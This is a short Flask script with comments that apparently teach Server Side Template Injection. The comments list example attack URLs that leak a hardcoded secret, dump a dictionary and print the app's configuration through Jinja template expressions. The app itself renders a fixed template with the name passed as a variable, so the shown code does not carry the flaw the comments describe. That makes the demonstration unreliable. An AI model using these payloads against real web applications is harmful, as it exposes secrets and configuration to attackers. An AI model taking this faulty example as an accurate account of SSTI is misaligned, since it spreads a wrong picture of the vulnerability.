# flask-example.py
from flask import Flask
from flask import request, render_template_string, render_template

app = Flask(__name__)

@app.route('/hello-flask')
def hello_flask():
	person = {'name':"world", 'secret':'jo5gmvlligcZ5YZGenWnGcol8JnwhWZd2lJZYo=='}
	if request.args.get('name'):
		person['name'] = request.args.get('name')
	template = '<h2>Hello {{person.name}}</h2>'
	return render_template_string(template, person=person)

if __name__ == "__main__":
	app.run(debug=True)

#Server Side Template Injection (SSTI) is an attack using the server-side templates
#of common web frameworks as an attack vector. The attack uses weaknesses in the
#way user input is embedded on the templates. SSTI attacks can be used to figure out
#internals of a web application, execute shell commands, and even fully compromise
#the servers.

#We passed {{ person.secret }}, which, in the Flask templating language (Flask uses Jinja2 templating), got evaluated to the
#value of the key secret in the dictionary person, effectively exposing the secret key of the app!
#http://127.0.0.1:5000/hello-flask?name=Tom%20{{person.secret}}

#The URL used for the attack is as follows: 
#http://localhost:5000/hello-flask?name={% for item in person %}<p>{{item, person[item] }}</p>{% endfor %}

#print out the Flask configuration by passing the name parameter as {{ config }}.
#http://127.0.0.1:5000/hello-flask?name={{config}}